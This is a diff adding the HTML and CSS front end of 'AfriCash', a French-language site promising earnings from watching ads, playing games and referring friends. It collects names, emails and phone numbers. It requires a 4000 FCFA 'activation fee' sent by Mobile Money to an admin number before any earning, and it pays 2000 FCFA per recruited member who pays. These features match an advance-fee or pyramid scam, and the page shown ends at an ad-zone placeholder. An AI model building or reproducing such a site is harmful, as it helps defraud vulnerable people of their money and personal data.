@@ -1,1 +1,1904 @@
+<!DOCTYPE html>
 
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="AfriCash - Gagnez de l'argent en regardant des publicités et en parrainant vos amis">
+    <meta name="keywords" content="gagner argent, publicité, parrainage, Afrique, mobile money">
+    <meta name="author" content="AfriCash">
+    <meta name="theme-color" content="#667eea">
+
+```
+<!-- Open Graph pour partage sur réseaux sociaux -->
+<meta property="og:title" content="AfriCash - Gagnez de l'argent facilement">
+<meta property="og:description" content="Plateforme pour gagner de l'argent en ligne">
+<meta property="og:type" content="website">
+
+<title>AfriCash - Gagnez de l'argent en ligne</title>
+
+<!-- Favicon -->
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💰</text></svg>">
+
+<style>
+    /* ================================
+       RESET & BASE STYLES
+       ================================ */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    :root {
+        /* Couleurs principales */
+        --primary-color: #667eea;
+        --secondary-color: #764ba2;
+        --accent-color: #FFE4B5;
+        --dark-color: #000;
+        --light-color: #fff;
+        --success-color: #2ecc71;
+        --error-color: #e74c3c;
+        --warning-color: #f39c12;
+        
+        /* Espacement */
+        --spacing-xs: 5px;
+        --spacing-sm: 10px;
+        --spacing-md: 15px;
+        --spacing-lg: 20px;
+        --spacing-xl: 30px;
+        
+        /* Border radius */
+        --radius-sm: 10px;
+        --radius-md: 15px;
+        --radius-lg: 20px;
+        --radius-full: 50%;
+        
+        /* Transitions */
+        --transition-fast: 0.2s ease;
+        --transition-normal: 0.3s ease;
+        --transition-slow: 0.5s ease;
+        
+        /* Ombres */
+        --shadow-sm: 0 2px 5px rgba(0,0,0,0.1);
+        --shadow-md: 0 4px 10px rgba(0,0,0,0.15);
+        --shadow-lg: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+        min-height: 100vh;
+        overflow-x: hidden;
+        line-height: 1.6;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ================================
+       ANIMATIONS
+       ================================ */
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+        from { 
+            transform: translateY(50px); 
+            opacity: 0; 
+        }
+        to { 
+            transform: translateY(0); 
+            opacity: 1; 
+        }
+    }
+
+    @keyframes slideDown {
+        from { 
+            transform: translateY(-50px); 
+            opacity: 0; 
+        }
+        to { 
+            transform: translateY(0); 
+            opacity: 1; 
+        }
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-10px); }
+        75% { transform: translateX(10px); }
+    }
+
+    @keyframes celebrate {
+        0% {
+            transform: translate(-50%, -50%) scale(0) rotate(0deg);
+            opacity: 0;
+        }
+        50% {
+            transform: translate(-50%, -50%) scale(1.2) rotate(180deg);
+            opacity: 1;
+        }
+        100% {
+            transform: translate(-50%, -50%) scale(1) rotate(360deg);
+            opacity: 0;
+        }
+    }
+
+    @keyframes shimmer {
+        0% { background-position: -1000px 0; }
+        100% { background-position: 1000px 0; }
+    }
+
+    @keyframes bounce {
+        0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+        40% { transform: translateY(-20px); }
+        60% { transform: translateY(-10px); }
+    }
+
+    /* ================================
+       LOADING SCREEN
+       ================================ */
+    .loading {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        animation: fadeIn 0.3s;
+    }
+
+    .loading-spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(255,255,255,0.3);
+        border-top-color: var(--light-color);
+        border-radius: var(--radius-full);
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+        color: var(--light-color);
+        font-size: 18px;
+        margin-top: var(--spacing-lg);
+        animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    /* ================================
+       HEADER
+       ================================ */
+    .header {
+        background: var(--dark-color);
+        color: var(--light-color);
+        padding: var(--spacing-md) var(--spacing-lg);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        box-shadow: var(--shadow-md);
+        animation: slideDown var(--transition-normal);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+    }
+
+    .user-badge {
+        display: flex;
+        align-items: center;
+        gap: var(--spacing-sm);
+        background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+        padding: 8px 15px;
+        border-radius: 25px;
+        animation: slideUp var(--transition-normal);
+        box-shadow: var(--shadow-sm);
+        transition: transform var(--transition-fast);
+    }
+
+    .user-badge:hover {
+        transform: translateY(-2px);
+        box-shadow: var(--shadow-md);
+    }
+
+    .user-avatar {
+        width: 35px;
+        height: 35px;
+        background: var(--primary-color);
+        border-radius: var(--radius-full);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+        animation: bounce 2s ease-in-out infinite;
+    }
+
+    .user-name {
+        color: var(--dark-color);
+        font-weight: bold;
+        font-size: 14px;
+    }
+
+    .bonus-btn {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: var(--light-color);
+        padding: 8px 20px;
+        border-radius: 20px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all var(--transition-fast);
+        box-shadow: var(--shadow-sm);
+        border: none;
+    }
+
+    .bonus-btn:hover {
+        transform: scale(1.05);
+        box-shadow: var(--shadow-md);
+    }
+
+    .menu-icon {
+        width: 30px;
+        height: 25px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        cursor: pointer;
+        transition: transform var(--transition-fast);
+    }
+
+    .menu-icon:hover {
+        transform: scale(1.1);
+    }
+
+    .menu-icon span {
+        width: 100%;
+        height: 3px;
+        background: var(--light-color);
+        border-radius: 2px;
+        transition: all var(--transition-fast);
+    }
+
+    .menu-icon:hover span:nth-child(1) {
+        transform: translateY(-2px);
+    }
+
+    .menu-icon:hover span:nth-child(3) {
+        transform: translateY(2px);
+    }
+
+    /* ================================
+       DASHBOARD
+       ================================ */
+    .dashboard {
+        max-width: 500px;
+        margin: var(--spacing-lg) auto;
+        padding: var(--spacing-lg);
+        animation: fadeIn var(--transition-slow);
+    }
+
+    .welcome-card {
+        background: var(--dark-color);
+        color: var(--light-color);
+        padding: var(--spacing-xl) var(--spacing-lg);
+        border-radius: var(--radius-lg);
+        text-align: center;
+        margin-bottom: var(--spacing-lg);
+        box-shadow: var(--shadow-lg);
+        animation: slideUp var(--transition-normal);
+    }
+
+    .welcome-text {
+        font-size: 16px;
+        margin-bottom: var(--spacing-sm);
+        animation: fadeIn 1s ease-in-out;
+    }
+
+    .balance-container {
+        background: var(--accent-color);
+        padding: var(--spacing-lg);
+        border-radius: var(--radius-md);
+        margin: var(--spacing-lg) 0;
+        position: relative;
+        overflow: hidden;
+        animation: pulse 2s ease-in-out infinite;
+    }
+
+    .balance-container::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255,255,255,0.3),
+            transparent
+        );
+        animation: shimmer 3s infinite;
+    }
+
+    .balance-label {
+        color: var(--dark-color);
+        font-size: 14px;
+        margin-bottom: var(--spacing-xs);
+        position: relative;
+        z-index: 1;
+    }
+
+    .balance-amount {
+        color: var(--dark-color);
+        font-size: 28px;
+        font-weight: bold;
+        position: relative;
+        z-index: 1;
+    }
+
+    .info-text {
+        font-size: 12px;
+        line-height: 1.6;
+        margin-top: var(--spacing-md);
+        opacity: 0.9;
+    }
+
+    /* ================================
+       ACTION BUTTONS
+       ================================ */
+    .action-buttons {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: var(--spacing-md);
+        margin: var(--spacing-xl) 0;
+    }
+
+    .action-btn {
+        background: var(--accent-color);
+        border: none;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-md);
+        cursor: pointer;
+        transition: all var(--transition-fast);
+        text-align: center;
+        box-shadow: var(--shadow-sm);
+        animation: slideUp var(--transition-normal);
+    }
+
+    .action-btn:nth-child(1) { animation-delay: 0.1s; }
+    .action-btn:nth-child(2) { animation-delay: 0.2s; }
+    .action-btn:nth-child(3) { animation-delay: 0.3s; }
+
+    .action-btn:hover {
+        transform: translateY(-5px);
+        box-shadow: var(--shadow-md);
+    }
+
+    .action-btn:active {
+        transform: translateY(-2px);
+    }
+
+    .action-btn-icon {
+        font-size: 30px;
+        margin-bottom: 8px;
+        display: inline-block;
+        transition: transform var(--transition-fast);
+    }
+
+    .action-btn:hover .action-btn-icon {
+        transform: scale(1.2) rotate(5deg);
+    }
+
+    .action-btn-text {
+        font-weight: bold;
+        color: var(--dark-color);
+        font-size: 14px;
+    }
+
+    /* ================================
+       GAME GRID
+       ================================ */
+    .game-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: var(--spacing-md);
+        margin: var(--spacing-lg) 0;
+    }
+
+    .game-card {
+        background: var(--dark-color);
+        border-radius: var(--radius-md);
+        padding: var(--spacing-lg);
+        text-align: center;
+        color: var(--light-color);
+        cursor: pointer;
+        transition: all var(--transition-fast);
+        box-shadow: var(--shadow-md);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .game-card::before {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 0;
+        height: 0;
+        background: rgba(255,255,255,0.1);
+        border-radius: var(--radius-full);
+        transform: translate(-50%, -50%);
+        transition: all var(--transition-normal);
+    }
+
+    .game-card:hover::before {
+        width: 200%;
+        height: 200%;
+    }
+
+    .game-card:hover {
+        transform: translateY(-5px) scale(1.05);
+        box-shadow: var(--shadow-lg);
+    }
+
+    .game-icon {
+        font-size: 40px;
+        margin-bottom: var(--spacing-sm);
+        position: relative;
+        z-index: 1;
+        display: inline-block;
+        animation: bounce 2s ease-in-out infinite;
+    }
+
+    .game-label {
+        font-weight: bold;
+        font-size: 14px;
+        position: relative;
+        z-index: 1;
+    }
+
+    /* ================================
+       FLUX/MODAL
+       ================================ */
+    .flux-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        backdrop-filter: blur(5px);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+        animation: fadeIn var(--transition-normal);
+    }
+
+    .flux-overlay.active {
+        display: flex;
+    }
+
+    .flux-content {
+        background: var(--light-color);
+        border-radius: var(--radius-lg);
+        padding: var(--spacing-xl) 25px;
+        max-width: 90%;
+        width: 400px;
+        max-height: 90vh;
+        overflow-y: auto;
+        animation: slideUp var(--transition-normal);
+        position: relative;
+        box-shadow: var(--shadow-lg);
+    }
+
+    .flux-close {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        width: 30px;
+        height: 30px;
+        background: var(--error-color);
+        color: var(--light-color);
+        border: none;
+        border-radius: var(--radius-full);
+        font-size: 20px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 10;
+        transition: all var(--transition-fast);
+        box-shadow: var(--shadow-sm);
+    }
+
+    .flux-close:hover {
+        transform: scale(1.1) rotate(90deg);
+        box-shadow: var(--shadow-md);
+    }
+
+    .flux-header {
+        background: var(--error-color);
+        color: var(--light-color);
+        padding: 10px 20px;
+        border-radius: var(--radius-sm);
+        text-align: center;
+        font-weight: bold;
+        margin-bottom: var(--spacing-lg);
+        font-size: 18px;
+        box-shadow: var(--shadow-sm);
+    }
+
+    .flux-title {
+        background: var(--accent-color);
+        padding: var(--spacing-md);
+        border-radius: var(--radius-md);
+        text-align: center;
+        font-weight: bold;
+        margin-bottom: var(--spacing-lg);
+        font-size: 16px;
+        box-shadow: var(--shadow-sm);
+    }
+
+    /* ================================
+       FORMS
+       ================================ */
+    .form-group {
+        margin-bottom: var(--spacing-md);
+        animation: slideUp var(--transition-normal);
+    }
+
+    .form-label {
+        display: block;
+        margin-bottom: var(--spacing-xs);
+        font-weight: bold;
+        color: #333;
+    }
+
+    .form-input {
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #ddd;
+        border-radius: var(--radius-sm);
+        font-size: 14px;
+        transition: all var(--transition-fast);
+        font-family: inherit;
+    }
+
+    .form-input:focus {
+        outline: none;
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        transform: translateY(-2px);
+    }
+
+    .form-input:disabled {
+        background: #f0f0f0;
+        cursor: not-allowed;
+    }
+
+    .form-input.error {
+        border-color: var(--error-color);
+        animation: shake 0.5s;
+    }
+
+    .submit-btn {
+        width: 100%;
+        background: var(--accent-color);
+        border: none;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-md);
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all var(--transition-fast);
+        margin-top: var(--spacing-lg);
+        box-shadow: var(--shadow-sm);
+        font-family: inherit;
+    }
+
+    .submit-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: var(--shadow-md);
+    }
+
+    .submit-btn:active {
+        transform: translateY(0);
+    }
+
+    .submit-btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+    }
+
+    /* ================================
+       CELEBRATION EFFECT
+       ================================ */
+    .celebration {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        font-size: 100px;
+        animation: celebrate 1s ease-out;
+        pointer-events: none;
+        z-index: 2000;
+        filter: drop-shadow(0 0 10px rgba(255,215,0,0.8));
+    }
+
+    /* ================================
+       MENU SIDEBAR
+       ================================ */
+    .menu-sidebar {
+        position: fixed;
+        top: 0;
+        right: -300px;
+        width: 280px;
+        height: 100%;
+        background: var(--light-color);
+        box-shadow: -2px 0 10px rgba(0,0,0,0.3);
+        transition: right var(--transition-normal);
+        z-index: 1500;
+        overflow-y: auto;
+    }
+
+    .menu-sidebar.active {
+        right: 0;
+    }
+
+    .menu-header {
+        background: var(--primary-color);
+        color: var(--light-color);
+        padding: var(--spacing-lg);
+        font-weight: bold;
+        font-size: 18px;
+    }
+
+    .menu-item {
+        padding: var(--spacing-md) var(--spacing-lg);
+        border-bottom: 1px solid #eee;
+        cursor: pointer;
+        transition: all var(--transition-fast);
+    }
+
+    .menu-item:hover {
+        background: #f8f9fa;
+        padding-left: 25px;
+    }
+
+    /* ================================
+       UTILITY CLASSES
+       ================================ */
+    .info-box {
+        background: #fff3cd;
+        border: 1px solid #ffc107;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-sm);
+        margin: var(--spacing-md) 0;
+        display: flex;
+        align-items: flex-start;
+    }
+
+    .info-box-text {
+        font-size: 13px;
+        line-height: 1.6;
+    }
+
+    .warning-icon {
+        color: var(--warning-color);
+        font-size: 20px;
+        margin-right: var(--spacing-xs);
+    }
+
+    .footer-note {
+        font-size: 11px;
+        color: #666;
+        text-align: center;
+        margin-top: var(--spacing-lg);
+        line-height: 1.4;
+    }
+
+    .toggle-link {
+        text-align: center;
+        margin-top: var(--spacing-md);
+        color: var(--primary-color);
+        cursor: pointer;
+        font-size: 14px;
+        text-decoration: underline;
+        transition: color var(--transition-fast);
+    }
+
+    .toggle-link:hover {
+        color: var(--secondary-color);
+    }
+
+    .validation-message {
+        font-size: 12px;
+        color: var(--error-color);
+        margin-top: var(--spacing-xs);
+        display: none;
+    }
+
+    .validation-message.show {
+        display: block;
+        animation: slideUp var(--transition-fast);
+    }
+
+    /* ================================
+       RESPONSIVE
+       ================================ */
+    @media (max-width: 768px) {
+        .dashboard {
+            padding: var(--spacing-sm);
+        }
+        
+        .action-buttons {
+            gap: var(--spacing-sm);
+        }
+        
+        .game-grid {
+            gap: var(--spacing-sm);
+        }
+    }
+
+    /* ================================
+       ADSENSE ZONE
+       ================================ */
+    .ad-container {
+        background: var(--dark-color);
+        padding: var(--spacing-lg);
+        border-radius: var(--radius-md);
+        text-align: center;
+        min-height: 300px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+    }
+
+    .ad-timer {
+        color: var(--light-color);
+        font-size: 48px;
+        font-weight: bold;
+        margin: var(--spacing-lg) 0;
+        animation: pulse 1s ease-in-out infinite;
+    }
+
+    .ad-text {
+        color: var(--light-color);
+        font-size: 24px;
+        margin: var(--spacing-lg) 0;
+    }
+
+    .adsense-zone {
+        width: 100%;
+        min-height: 250px;
+        background: #f0f0f0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: var(--radius-sm);
+        margin: var(--spacing-sm) 0;
+    }
+
+    /* ================================
+       DEPOSIT INFO
+       ================================ */
+    .deposit-info {
+        background: #e7f3ff;
+        border: 2px solid #2196F3;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-sm);
+        margin: var(--spacing-md) 0;
+    }
+
+    .deposit-number {
+        font-size: 20px;
+        font-weight: bold;
+        color: #2196F3;
+        text-align: center;
+        margin: var(--spacing-sm) 0;
+        letter-spacing: 1px;
+    }
+
+    .deposit-amount {
+        font-size: 24px;
+        font-weight: bold;
+        color: var(--error-color);
+        text-align: center;
+        margin: var(--spacing-md) 0;
+    }
+
+    .referral-code {
+        background: #f8f9fa;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-sm);
+        text-align: center;
+        margin: var(--spacing-md) 0;
+        word-break: break-all;
+        font-family: monospace;
+        font-size: 12px;
+        border: 2px dashed #ddd;
+    }
+
+    .copy-share-btn {
+        background: var(--accent-color);
+        border: none;
+        padding: var(--spacing-md);
+        border-radius: var(--radius-md);
+        font-weight: bold;
+        cursor: pointer;
+        width: 100%;
+        margin-top: var(--spacing-md);
+        transition: all var(--transition-fast);
+        font-family: inherit;
+    }
+
+    .copy-share-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: var(--shadow-md);
+    }
+
+    /* ================================
+       SCROLLBAR CUSTOM
+       ================================ */
+    ::-webkit-scrollbar {
+        width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+
+    ::-webkit-scrollbar-thumb {
+        background: var(--primary-color);
+        border-radius: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+        background: var(--secondary-color);
+    }
+</style>
+```
+
+</head>
+<body>
+    <!-- ================================
+         ÉCRAN DE CHARGEMENT
+         ================================ -->
+    <div id="loadingScreen" class="loading">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Chargement d'AfriCash...</div>
+    </div>
+
+```
+<!-- ================================
+     HEADER
+     ================================ -->
+<div id="header" class="header" style="display: none;">
+    <div class="user-badge">
+        <div class="user-avatar">👤</div>
+        <span class="user-name" id="userName">Utilisateur</span>
+    </div>
+    <button class="bonus-btn" onclick="alert('Bonus disponibles bientôt !')">Bonus 🎁</button>
+    <div class="menu-icon" onclick="toggleMenu()">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<!-- ================================
+     DASHBOARD
+     ================================ -->
+<div id="dashboard" class="dashboard" style="display: none;">
+    <div class="welcome-card">
+        <div class="welcome-text" id="platformName">Bienvenue sur AfriCash</div>
+        <div class="welcome-text" id="platformSlogan">commencer à gagner de l'argent dès aujourd'hui</div>
+        
+        <div class="balance-container">
+            <div class="balance-label">solde : <span id="balanceAmount">0,00</span> FCFA</div>
+        </div>
+
+        <div class="info-text">
+            Bienvenue sur notre plate-forme d'investissement.<br>
+            Ici vous pourrez gagner de l'argent, jouer à des jeux,<br>
+            regarder de la pub et vous serez récompensé en fonction de vos<br>
+            performances respect de conditions et politiques de plate-forme tout droit réserver.
+        </div>
+    </div>
+
+    <div class="action-buttons">
+        <button class="action-btn" onclick="openShop()">
+            <div class="action-btn-icon">💻</div>
+            <div class="action-btn-text">Formation</div>
+        </button>
+        <button class="action-btn" onclick="openInvite()">
+            <div class="action-btn-icon">🎁</div>
+            <div class="action-btn-text">Invité</div>
+        </button>
+        <button class="action-btn" onclick="openWithdraw()">
+            <div class="action-btn-icon">💰</div>
+            <div class="action-btn-text">Retrait</div>
+        </button>
+    </div>
+
+    <div class="game-grid">
+        <div class="game-card" onclick="checkDepositAndStartEarning()">
+            <div class="game-icon">💎</div>
+            <div class="game-label">Jeux</div>
+            <div class="game-label">Publicité</div>
+        </div>
+        <div class="game-card" onclick="checkDepositAndStartEarning()">
+            <div class="game-icon">💎</div>
+            <div class="game-label">Publicité</div>
+            <div class="game-label">Jeux</div>
+        </div>
+        <div class="game-card" onclick="checkDepositAndStartEarning()">
+            <div class="game-icon">💎</div>
+            <div class="game-label">Jeux</div>
+            <div class="game-label">Publicité</div>
+        </div>
+    </div>
+
+    <div class="game-card" style="margin: 20px 0;" onclick="checkDepositAndStartEarning()">
+        <div style="display: flex; justify-content: center; align-items: center; gap: 10px;">
+            <span style="font-size: 30px;">⭐</span>
+            <span style="font-size: 18px; font-weight: bold;">Gagner</span>
+            <span style="font-size: 30px;">⭐</span>
+        </div>
+    </div>
+
+    <div class="game-card" style="margin: 20px 0;">
+        <div class="game-label">Publicité</div>
+    </div>
+
+    <div class="footer-note">
+        Bienvenue sur notre plate-forme d'investissement.<br>
+        Ici vous pourrez gagner de l'argent, jouer à des jeux, regarder de la pub et vous serez récompensé en fonction de vos performances respect de conditions et politiques de plate-forme tout droit réserver.
+    </div>
+</div>
+
+<!-- ================================
+     MENU SIDEBAR
+     ================================ -->
+<div id="menuSidebar" class="menu-sidebar">
+    <div class="menu-header">Menu</div>
+    <div class="menu-item" onclick="alert('Newsletter')">📧 Newsletter</div>
+    <div class="menu-item" onclick="alert('S\'abonner')">🔔 S'abonner</div>
+    <div class="menu-item" onclick="alert('Conditions')">📋 Conditions d'utilisation</div>
+    <div class="menu-item" onclick="alert('Politique de confidentialité')">🔒 Politique de confidentialité</div>
+    <div class="menu-item" onclick="alert('Support')">💬 Support</div>
+    <div class="menu-item" onclick="alert('À propos')">ℹ️ À propos</div>
+    <div class="menu-item" onclick="logout()">🚪 Déconnexion</div>
+</div>
+
+<!-- ================================
+     FLUX 1: INSCRIPTION / CONNEXION
+     ================================ -->
+<div id="fluxInscription" class="flux-overlay active">
+    <div class="flux-content">
+        <button class="flux-close" onclick="closeFlux('fluxInscription')" style="display: none;">✕</button>
+        <div class="flux-header">FLUX 1</div>
+        <div class="flux-title">Bienvenue sur <span id="platformNameFlux1">AfriCash</span><br><span id="platformSloganFlux1">commencer à gagner de l'argent dès aujourd'hui</span></div>
+        
+        <div style="background: var(--accent-color); padding: 15px; border-radius: 15px; text-align: center; margin: 20px 0;">
+            <div style="font-weight: bold; color: #000;">solde : 0,00 FCFA</div>
+        </div>
+
+        <div class="info-text" style="margin-bottom: 20px; color: #333;">
+            Bienvenue sur notre plate-forme d'investissement.<br>
+            Ici vous pourrez gagner de l'argent, jouer à des jeux,<br>
+            regarder de la pub et vous serez récompensé en fonction de vos<br>
+            performances respect de conditions et politiques de plate-forme tout droit réserver.
+        </div>
+
+        <form id="inscriptionForm">
+            <div class="form-group">
+                <label class="form-label">Nom :</label>
+                <input type="text" class="form-input" id="nomInscrit" required placeholder="Votre nom complet">
+                <div class="validation-message" id="nomError">Le nom est requis</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Adresse Email :</label>
+                <input type="email" class="form-input" id="emailInscrit" required placeholder="votre@email.com">
+                <div class="validation-message" id="emailError">Email invalide</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Numéro de Téléphone :</label>
+                <input type="tel" class="form-input" id="numeroInscrit" required placeholder="+226 XX XX XX XX">
+                <div class="validation-message" id="numeroError">Numéro invalide</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Code Parrain (Optionnel) :</label>
+                <input type="text" class="form-input" id="codeParrain" placeholder="Code de parrainage">
+            </div>
+
+            <button type="submit" class="submit-btn">S'inscrire</button>
+        </form>
+
+        <form id="connexionForm" style="display: none;">
+            <div class="form-group">
+                <label class="form-label">Adresse Email :</label>
+                <input type="email" class="form-input" id="emailConnexion" required placeholder="votre@email.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Numéro de Téléphone :</label>
+                <input type="tel" class="form-input" id="numeroConnexion" required placeholder="+226 XX XX XX XX">
+            </div>
+
+            <button type="submit" class="submit-btn">Se connecter</button>
+        </form>
+
+        <div class="toggle-link" onclick="toggleAuthMode()">
+            <span id="toggleText">Déjà inscrit ? Se connecter</span>
+        </div>
+
+        <div class="footer-note">
+            En vous inscrivant, vous acceptez nos conditions d'utilisation et notre politique de confidentialité.
+        </div>
+    </div>
+</div>
+
+<!-- ================================
+     FLUX 2: INVITATION
+     ================================ -->
+<div id="fluxInvite" class="flux-overlay">
+    <div class="flux-content">
+        <button class="flux-close" onclick="closeFlux('fluxInvite')">✕</button>
+        <div class="flux-header">FLUX 2</div>
+        <div class="flux-title">Invité & Gagnez <span id="referralBonusDisplay">2000</span> FCFA<br>par personne inscrite qui active son compte</div>
+        
+        <div class="info-box">
+            <span class="warning-icon">ℹ️</span>
+            <div class="info-box-text">
+                <strong>Comment ça marche :</strong><br>
+                1. Copiez votre lien de parrainage<br>
+                2. Partagez-le sur WhatsApp, Facebook, etc.<br>
+                3. Recevez <span id="referralBonusDisplay2">2000</span> FCFA quand votre filleul active son compte
+            </div>
+        </div>
+        
+        <div class="referral-code" id="referralLink">Chargement...</div>
+
+        <button class="copy-share-btn" onclick="copyReferralLink()">📋 Copier & Partager</button>
+
+        <div class="footer-note" style="margin-top: 20px;">
+            Vos filleuls bénéficient également d'une inscription facile avec votre code pré-rempli !
+        </div>
+    </div>
+</div>
+
+<!-- ================================
+     FLUX 3: RETRAIT
+     ================================ -->
+<div id="fluxRetrait" class="flux-overlay">
+    <div class="flux-content">
+        <button class="flux-close" onclick="closeFlux('fluxRetrait')">✕</button>
+        <div class="flux-header">FLUX 3</div>
+        <div class="flux-title">Demande de RETRAIT</div>
+        
+        <div class="info-box">
+            <span class="warning-icon">💰</span>
+            <div class="info-box-text">
+                <strong>Votre solde disponible :</strong> <span id="soldeDisponible">0 FCFA</span><br>
+                <strong>Minimum de retrait :</strong> <span id="minWithdrawalDisplay">5000</span> FCFA
+            </div>
+        </div>
+        
+        <form id="retraitForm">
+            <div class="form-group">
+                <label class="form-label">Adresse Email :</label>
+                <input type="email" class="form-input" id="emailRetrait" required placeholder="votre@email.com">
+                <div class="validation-message" id="emailRetraitError">Email requis</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Numéro de Téléphone :</label>
+                <input type="tel" class="form-input" id="numeroRetrait" required placeholder="+226 XX XX XX XX">
+                <div class="validation-message" id="numeroRetraitError">Numéro requis</div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Montant à Retirer :</label>
+                <input type="number" class="form-input" id="montantRetrait" required placeholder="Minimum 5000 FCFA" min="5000">
+                <div class="validation-message" id="montantError">Montant invalide ou insuffisant</div>
+            </div>
+
+            <button type="submit" class="submit-btn">Demander le Retrait</button>
+        </form>
+
+        <div class="info-box">
+            <span class="warning-icon">⚠️</span>
+            <div class="info-box-text">
+                Vous recevrez vos fonds dans les 24-48 heures après validation.<br>
+                Un email de confirmation vous sera envoyé.
+            </div>
+        </div>
+
+        <div class="footer-note">
+            Les retraits sont traités du lundi au vendredi de 9h à 18h.
+        </div>
+    </div>
+</div>
+
+<!-- ================================
+     FLUX 4: DÉPÔT / ACTIVATION
+     ================================ -->
+<div id="fluxDepot" class="flux-overlay">
+    <div class="flux-content">
+        <button class="flux-close" onclick="closeFlux('fluxDepot')">✕</button>
+        <div class="flux-header">ACTIVATION REQUISE</div>
+        <div class="flux-title">Pour commencer à gagner, activez votre compte</div>
+        
+        <div class="deposit-info">
+            <div style="font-weight: bold; margin-bottom: 10px; text-align: center;">💳 Frais d'activation unique</div>
+            <div class="deposit-amount"><span id="depositAmountDisplay">4000</span> FCFA</div>
+            <div style="font-weight: bold; margin-top: 15px; text-align: center;">📱 Envoyer via Mobile Money à :</div>
+            <div class="deposit-number" id="adminPhoneNumber">+226 XX XX XX XX</div>
+        </div>
+
+        <div class="info-box">
+            <span class="warning-icon">ℹ️</span>
+            <div class="info-box-text">
+                <strong>Instructions :</strong><br>
+                1. Envoyez exactement <span id="depositAmountDisplay2">4000</span> FCFA au numéro ci-dessus<br>
+                2. Attendez quelques instants<br>
+                3. Vous recevrez un SMS avec un lien d'activation<br>
+                4. Cliquez sur le lien pour activer votre compte<br>
+                5. Commencez immédiatement à gagner !
+            </div>
+        </div>
+
+        <button class="submit-btn" onclick="confirmDepositSent()">✅ J'ai effectué le paiement</button>
+
+        <div class="footer-note" style="margin-top: 20px;">
+            ⚡ Activation instantanée après vérification du paiement<br>
+            🔒 Ce paiement unique active votre compte à vie
+        </div>
+    </div>
+</div>
+
+<!-- ================================
+     FLUX 5: PUBLICITÉ
+     ================================ -->
+<div id="fluxPub" class="flux-overlay">
+    <div class="flux-content">
+        <button class="flux-close" onclick="cancelAdViewing()" style="background: var(--warning-color);">✕</button>
+        <div class="flux-header">FLUX 4</div>
+        
+        <div class="ad-container">
+            <div class="ad-timer" id="adTimer">30</div>
+            <div class="ad-text">Publicité en cours...</div>
+            
+            <!-- ZONE GOOGLE ADSENSE -->
